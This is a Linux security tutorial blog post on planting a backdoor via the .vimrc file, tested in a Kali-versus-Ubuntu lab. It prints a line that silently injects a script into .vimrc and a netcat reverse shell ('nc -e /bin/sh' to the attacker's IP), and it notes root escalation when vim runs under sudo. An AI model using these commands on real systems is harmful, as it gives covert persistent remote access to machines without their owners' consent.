---
layout: single
title: "Backdoor Via Vim"
date: 2024-06-07
categories: [Linux]
tags: [vim, vimrc, backdoor, persistence, linux]
author_profile: true
toc: true
toc_sticky: true
read_time: true
show_date: true
---

The VIM editor needs no introduction; it is a well-known and widely used command-line text editor that comes pre-installed on most Unix and Linux operating systems. In many Linux setups, user-specific VIM configuration settings are stored in the user's home directory within the `.vimrc` file. This file, which is automatically loaded when Vim starts, accepts VIM-specific scripting commands that are usually used to enable users to tailor their editing environment to their preferences.

This interesting setup presents an opportunity for attackers. By manipulating the `.vimrc` file, one can execute unintended actions during a user's VIM session without the user's knowledge or permission, especially if VIM operates within an unrestricted environment.

To get a feel for that, let's experiment. To execute a command within the VIM environment, you need to precede any shell command with a colon and an exclamation mark. Execute the following command within VIM to get the user ID (or username):

```sh
:!echo $UID
# OR
:!echo $USER
```

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/vimHacks/BackdoorViaVim/images/UID.png)

You see, once you hit enter, the user ID is printed on the screen. This is because VIM has access to the shell environment's variables.

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/vimHacks/BackdoorViaVim/images/1000.png)

Great, let's get back to the `.vimrc` file. We can inject any commands into the `.vimrc` file, and once the current user starts Vim, these commands are executed in the background. One particularly interesting command is the source command, used to execute commands from a script file in the current shell session.

We can illustrate this with an example scenario: suppose an attacker, using a Kali Linux machine, gains access to a victim machine running Ubuntu. The attacker wants to establish a backdoor on the victim machine, such as creating a netcat reverse shell connection to the attacker's machine.

First, on the victim machine, the attacker creates or modifies the `.vimrc` file by appending the following line:

```sh
echo ':silent !source /home/msbit/Labs/vimHacking/ncReverseSh.sh &' >> ~/.vimrc
```

Let's analyze this command: Firstly, the `:silent` suppresses any debug output that would typically be displayed to the user when Vim runs. Then, the `source` command, preceded by an exclamation mark to indicate that this is a shell command, loads and executes the script ncReverseSh.sh, followed by the `&` to execute the command in the background."

Now, the attacker need to populate the script `ncReverseSh.sh` with the payload:

```sh
#!/bin/bash
nc -e /bin/sh 192.168.171.1 7777 &
```

This is a simple script that invokes the nc command with the `-e` switch, specifying the program (`/bin/sh`) to execute upon connection establishment, followed by the attacker's IP and listening port. Again, the & ensures the command runs in the background

Okay, let's give it a shot. Start a netcat listener on the attacker machine on port 7777:

```sh
nc -lnvp 7777
```

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/vimHacks/BackdoorViaVim/images/reverseShell.png)

You should know that the reverse shell obtained doesn't necessarily grant access beyond that of the current user. However, if the victim runs VIM with sudo, the attacker might get a root shell. However, this is only half the story; it depends on the Linux distribution. For example, in systems like Ubuntu and Red Hat, VIM uses the current user's `.vimrc` configuration file even within a sudo context. Therefore, if the user invokes VIM via sudo, our sourced script will execute as root. On the other hand, in distributions like Debian, VIM defaults to the root user's configuration when invoked with sudo, without using the current user's settings.

One more thing: another idea is to check the sudo permissions granted to the current user. Sometimes, a regular user may be authorized to run only specific applications with sudo privileges:

```sh
sudo -l

(root) NOPASSWD: /usr/bin/vim /opt/whatever.conf
```

In this example, the configuration allows the root user to execute `/usr/bin/vim` on `/opt/whatever.conf` without requiring a password.

In conclusion, we have seen how an attacker can exploit a legitimate program to achieve malicious goals.

Happy Learning... <br>
Mahmoud Jadaan

### Test Environment

- Victim
  - Ubuntu (16.04.7 LTS (Xenial Xerus), x86_64 GNU/Linux)
  - netcat-traditional/xenial,now 1.10-41 amd64
  - VIM - Vi IMproved 7.4
 
- Attacker
  - Kali GNU/Linux Rolling 6.6.15-2
